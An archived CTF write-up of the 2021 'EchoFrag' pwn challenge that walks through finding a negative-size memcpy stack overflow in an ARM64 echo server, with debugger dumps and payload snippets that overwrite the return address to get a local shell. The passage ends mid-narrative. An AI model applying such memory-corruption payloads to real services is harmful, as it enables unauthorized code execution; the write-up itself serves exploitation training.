# EchoFrag

**CTF:** HackersPlayground 2021  
**Category:** pwn  
**Original writeup:** <https://kileak.github.io/ctf/2021/sstf-echofrag/> — by **kileak**. All credit goes to the original author; this is an archived copy.

---

EchoFrag Description I made a echo server to practice network fragmentation! Could you test that implementation of fragmentation was working correctly? echofrag.sstf.site:31513 Attachment: EchoFrag xpl.py Team: Super Guesser

EchoFrag was an arm binary, that reads an input package, and depending on the type, it will either just echo the input back or store it into an echo buffer , which it will echo back when it’s full .

The package we have to send looks like

struct Buffer { unsigned char Type ; unsigned short Size ; char Data [ 512 ] }

void handle_server () { signed int cur_echo_off ; unsigned int read_len ; signed int echo_off ; signed int echo_size ; Buffer echo_buffer ; Buffer input_buffer ; memset ( & echo_buffer , 0 , 0x203 ); cur_echo_off = 3 ; while ( true ) { // Read package read_len = read ( 0 , & input_buffer , 0x203 ); // Read package len must be >= 3 if (( int ) read_len <= 0 ) return - 1 ; if ( read_len <= 2 ) return - 2 ; // Type 1: Unbuffered echo if ( input_buffer . Type == 1 ) { if ( input_buffer . Size + 3 > 0x203 ) return - 3 ; // If buffer size is smaller than read bytes, echo it back if ( input_buffer . Size + 3 <= read_len ) do_write ( & input_buffer ); // Copy input buffer over echo_buffer (This will overwrite the size of echo_buffer!) memcpy ( & echo_buffer , & input_buffer , ( int ) read_len ); cur_echo_off = read_len ; } // Type 2: Buffered echo else { // Find current offset in echo buffer to write to echo_off = cur_echo_off + read_len - 3 ; echo_size = echo_buffer . size ; if ( echo_off > echo_buffer . size ) { read_len = echo_buffer . size - cur_echo_off ; echo_off = echo_buffer . size ; } // Copy data from input_buffer into echo_buffer memcpy ( & echo_buffer . field_0 + cur_echo_off , input_buffer . Data , ( int )( read_len - 3 )); cur_echo_off = echo_off ; // If current offset in echo buffer is bigger than echo buffer size, echo it back if ( echo_off >= echo_size ) { cur_echo_off = 3 ; do_write ( & echo_buffer ); } } } } void do_write ( Buffer * a1 ) { write ( 1 , a1 -> Data , a1 -> Size - 3 ); }

Some things to note here

When sending a package with type 1, the input package will be copied into echo_buffer (effectively overwriting its size with the one from the input package)

(effectively overwriting its with the one from the input package) When sending a package with type 2, only the data from the input package will be copied at the current offset ( cur_echo_off ) in the echo_buffer and increase the offset by the data size.

) in the and increase the offset by the data size. When the offset would exceed the limit of the echo buffer, read_len will be limited to the remaining space in the buffer, so that it cannot be overflown.

will be limited to the remaining space in the buffer, so that it cannot be overflown. When the current offset equals the size of the echo buffer, it will be printed back.

Let’s see how this looks on the stack

0x5501812890: 0x0000005500000c58 0x0000005501812af0 0x55018128a0: 0x0000005501812920 0x000000fd018148a4 0x55018128b0: 0x0000005501812d00 0x0000005500000c48 <= X / Return address 0x55018128c0: 0x0000005501843a18 0x0000000301812e50 0x55018128d0: 0x0000005500000103 0x0000005500000000 <= X / cur_echo_off / read_len / echo_off 0x55018128e0: 0x0000010300000000 0x4141414141010001 <= echo_size (32bit) / Echo Buffer Start (Type/Size/Data) 0x55018128f0: 0x4141414141414141 0x4141414141414141 0x5501812900: 0x4141414141414141 0x4141414141414141 0x5501812910: 0x4141414141414141 0x4141414141414141 0x5501812920: 0x4141414141414141 0x4141414141414141 0x5501812930: 0x4141414141414141 0x4141414141414141 0x5501812940: 0x4141414141414141 0x4141414141414141 0x5501812950: 0x4141414141414141 0x4141414141414141 0x5501812960: 0x4141414141414141 0x4141414141414141 0x5501812970: 0x4141414141414141 0x4141414141414141 0x5501812980: 0x4141414141414141 0x4141414141414141 0x5501812990: 0x4141414141414141 0x4141414141414141 0x55018129a0: 0x4141414141414141 0x4141414141414141 0x55018129b0: 0x4141414141414141 0x4141414141414141 0x55018129c0: 0x4141414141414141 0x4141414141414141 0x55018129d0: 0x4141414141414141 0x4141414141414141 0x55018129e0: 0x4141414141414141 0x0000000000414141 0x55018129f0: 0x0000000000000000 0x0000000000000000 0x5501812a00: 0x0000000000000000 0x0000000000000000 0x5501812a10: 0x0000000000000000 0x0000000000000000 0x5501812a20: 0x0000000000000000 0x0000000000000000 0x5501812a30: 0x0000000000000000 0x0000000000000000 0x5501812a40: 0x0000000000000000 0x0000000000000000 0x5501812a50: 0x0000000000000000 0x0000000000000000 0x5501812a60: 0x0000000000000000 0x0000000000000000 0x5501812a70: 0x0000000000000000 0x0000000000000000 0x5501812a80: 0x0000000000000000 0x0000000000000000 0x5501812a90: 0x0000000000000000 0x0000000000000000 0x5501812aa0: 0x0000000000000000 0x0000000000000000 0x5501812ab0: 0x0000000000000000 0x0000000000000000 0x5501812ac0: 0x0000000000000000 0x0000000000000000 0x5501812ad0: 0x0000000000000000 0x0000000000000000 0x5501812ae0: 0x0000000000000000 0x0000000000000000 0x5501812af0: 0x4141414141010001 0x4141414141414141 <= Input buffer start 0x5501812b00: 0x4141414141414141 0x4141414141414141 0x5501812b10: 0x4141414141414141 0x4141414141414141 0x5501812b20: 0x4141414141414141 0x4141414141414141 0x5501812b30: 0x4141414141414141 0x4141414141414141 0x5501812b40: 0x4141414141414141 0x4141414141414141 0x5501812b50: 0x4141414141414141 0x4141414141414141 0x5501812b60: 0x4141414141414141 0x4141414141414141 0x5501812b70: 0x4141414141414141 0x4141414141414141 0x5501812b80: 0x4141414141414141 0x4141414141414141 0x5501812b90: 0x4141414141414141 0x4141414141414141

So from a first glance, it seems, that we cannot write data outside of those two buffers. But while playing around with some test data and lengths, the binary suddenly crashed in the memcpy into the echo_buffer .

This arised, because I didn’t send a package type 1, which would have initialized the size of echo_buffer (which is in the beginning just 0).

echo_off = cur_echo_off + read_len - 3 ; // echo_off = 3 + read bytes -3 = read_bytes echo_size = echo_buffer . size ; // echo_size = 0 if ( echo_off > echo_buffer . size ) // will always be true for zero size buffer { read_len = echo_buffer . size - cur_echo_off ; // read_len = 0 - last read byte count (will be negative) echo_off = echo_buffer . size // echo_off = 0 } // Copy data from input_buffer into echo_buffer memcpy ( & echo_buffer . field_0 + cur_echo_off , input_buffer . Data , ( int )( read_len - 3 )); // Store echo_off back into cur_echo_off cur_echo_off = echo_off ;

Since the now negative read_len is casted to int , memcpy will be called with a size of -6

───────────────────────────────────────────────────────────────────────────────────── registers ──── $x0 : 0x00000055018128eb → 0x0000000000000000 → 0x0000000000000000 $x1 : 0x0000005501812af3 → 0x0000004242424242 → 0x0000004242424242 $x2 : 0xfffffffffffffffa → 0xfffffffffffffffa $x3 : 0x00000055018128eb → 0x0000000000000000 → 0x0000000000000000 $x4 : 0x0000005501812af3 → 0x0000004242424242 → 0x0000004242424242 .... $sp : 0x00000055018128b0 → 0x0000005501812d00 → 0x0000005501812d10 → 0x0000000000000000 → 0x0000000000000000 $pc : 0x0000005500000bc4 → 0xb94027a097ffff17 → 0xb94027a097ffff17 $cpsr: [negative zero CARRY overflow interrupt fast] $fpsr: 0x0000000000000000 → 0x0000000000000000 $fpcr: 0x0000000000000000 → 0x0000000000000000 ──────────────────────────────────────────────────────────────────────────────── code:arm64:ARM ──── 0x5500000bb8 mov x2, x0 0x5500000bbc mov x1, x4 0x5500000bc0 mov x0, x3 → 0x5500000bc4 bl 0x5500000820 <memcpy@plt> ↳ 0x5500000820 <memcpy@plt+0> adrp x16, 0x5500010000 0x5500000824 <memcpy@plt+4> ldr x17, [x16, #3920] 0x5500000828 <memcpy@plt+8> add x16, x16, #0xf50 0x550000082c <memcpy@plt+12> br x17 0x5500000830 <setbuf@plt+0> adrp x16, 0x5500010000 0x5500000834 <setbuf@plt+4> ldr x17, [x16, #3928] ───────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00000055018128b0│+0x0000: 0x0000005501812d00 → 0x0000005501812d10 → 0x0000000000000000 → 0x0000000000000000 ← $x29, $sp 0x00000055018128b8│+0x0008: 0x0000005500000c48 → 0xa8c17bfd52800000 → 0xa8c17bfd52800000 0x00000055018128c0│+0x0010: 0x0000005501843a18 → 0x0000005501813000 → 0x00010102464c457f → 0x00010102464c457f 0x00000055018128c8│+0x0018: 0x0000000301812e50 → 0x0000000301812e50 0x00000055018128d0│+0x0020: 0x00000000fffffffd → 0x00000000fffffffd 0x00000055018128d8│+0x0028: 0x0000000300000000 → 0x0000000300000000 ─────────────────────────────────────────────────────────────────────────── arguments (guessed) ──── memcpy@plt ( $x0 = 0x00000055018128eb → 0x0000000000000000 → 0x0000000000000000, $x1 = 0x0000005501812af3 → 0x0000004242424242 → 0x0000004242424242, $x2 = 0xfffffffffffffffa → 0xfffffffffffffffa )

This should copy our input_buffer ( 0x0000005501812af3 ) into the echo_buffer ( 0x00000055018128eb ). Let’s check the memory around the echo_buffer before memcpy is executed.

gef➤ x/30gx 0x00000055018128eb-0x4b 0x55018128a0: 0x0000005501812920 0x00000055018148a4 0x55018128b0: 0x0000005501812d00 0x0000005500000c48 <= X / return address 0x55018128c0: 0x0000005501843a18 0x0000000301812e50 0x55018128d0: 0x00000000fffffffd 0x0000000300000000 0x55018128e0: 0x0000000000000000 0x0000000000000000 <= echo_size (32bit) / Echo Buffer Start (Type/Size/Data) 0x55018128f0: 0x0000000000000000 0x0000000000000000 0x5501812900: 0x0000000000000000 0x0000000000000000 0x5501812910: 0x0000000000000000 0x0000000000000000 0x5501812920: 0x0000000000000000 0x0000000000000000 0x5501812930: 0x0000000000000000 0x0000000000000000 0x5501812940: 0x0000000000000000 0x0000000000000000

And now, after the memcpy with its huge (negative) size was executed.

gef➤ x/30gx 0x00000055018128eb-0x4b 0x55018128a0: 0x0000005501812920 0x0000000000000000 0x55018128b0: 0x0000000000000000 0x0000000000000000 <= X / return address 0x55018128c0: 0x0000000000000000 0x0000000000000000 0x55018128d0: 0x0000000000000000 0x0000000000000000 0x55018128e0: 0x0000000000000000 0x4242424242000000 <= echo_size (32bit) / Echo Buffer Start (Type/Size/Data) 0x55018128f0: 0x0000000000000000 0x0000000000000000 0x5501812900: 0x0000000000000000 0x0000005501842ed0 0x5501812910: 0x0000000000000000 0x0000000000000000 0x5501812920: 0x0000000000000000 0x0000000000000000 0x5501812930: 0x0000000000000000 0x0000000000000000 0x5501812940: 0x0000000000000000 0x0000000000000000

Uh oh, it seems memcpy has kinda overflown its offset while copying the data and also overwritten the data before the echo_buffer overwriting our state stack variables and even the return address of the function itself.

Let’s see, if we can control that overflown data.

# prepare payload payload = cyclic_metasploit ( 0x200 - 8 ) # prepare size of echo_buffer to do a valid copy pkg1 ( len ( payload ) + 8 , "" ) # copy payload into echo_buffer (with valid size) pkg2 ( 0 , payload ) # overwrite echo buffer size with 0 pkg1 ( 0 , "" ) # trigger negative memcpy pkg2 ( 0 , "" )

This will first do a valid copy into echo buffer with our payload, then overwrite the size of the echo buffer with 0 and trigger the negative memcpy .

gef➤ x/30gx 0x00000055018128eb-0x4b 0x55018128a0: 0x3070415501812920 0x7041327041317041 0x55018128b0: 0x4135704134704133 0x3870413770413670 <= X / return address 0x55018128c0: 0x7141307141397041 0x4133714132714131 0x55018128d0: 0x3671413571413471 0x0000000000377141 0x55018128e0: 0x0000000000000000 0x6141306141000001 <= echo_size (32bit) / Echo Buffer Start (Type/Size/Data) 0x55018128f0: 0x4133614132614131 0x3661413561413461 0x5501812900: 0x6141386141376141 0x4131624130624139 0x5501812910: 0x3462413362413262 0x6241366241356241 0x5501812920: 0x4139624138624137 0x3263413163413063 0x5501812930: 0x6341346341336341 0x4137634136634135 0x5501812940: 0x3064413963413863 0x6441326441316441 0x5501812950: 0x4135644134644133 0x3864413764413664 0x5501812960: 0x6541306541396441 0x4133654132654131 0x5501812970: 0x3665413565413465 0x6541386541376541 0x5501812980: 0x4131664130664139 0x3466413366413266

Ok, so we can overwrite the return address with our input. At this point, this could have been finished already, since the addresses in the binary will always be fixed…

But I was kinda tired at that point and just wrote a payload, which gave me a local shell, but didn’t work remote…

# prepare payload payload = "A" * 469 payload += p64 ( 0x5500000A28 ) # prepare size of echo_buffer to do a valid copy pkg1 ( len ( payload ) + 8 , "" ) # copy payload into echo_buffer (with valid size) pkg2 ( 0 , payload ) # overwrite echo buffer size with 0 pkg1 ( 0 , "" ) pkg2 ( 0 , "" ) print ( "Enter to trigger shell" )

$ python writeup.py [+] Starting local process '/usr/bin/qemu-aarch64': pid 17329 [17329] [*] Paused (press any to continue) [*] Switching to interactive mode $ [*] Interrupted [*] Switching to interactive mode $ [*] Interrupted [*] Switching to interactive mode $ [*] Interrupted [*] Switching to interactive mode $ [*] Interrupted Enter to trigger shell [*] Switching to interactive mode $ $ ls EchoFrag xpl.py $

Yep, shell working, let’s just grab the flag… But the exploit crashed remote all the time…

Spoiler: I used 0x5500000000 as base address, which it is in my local qemu env, but remote the base address was 0x4000000000 (but also static).

At that point, I made a dreadful decision:
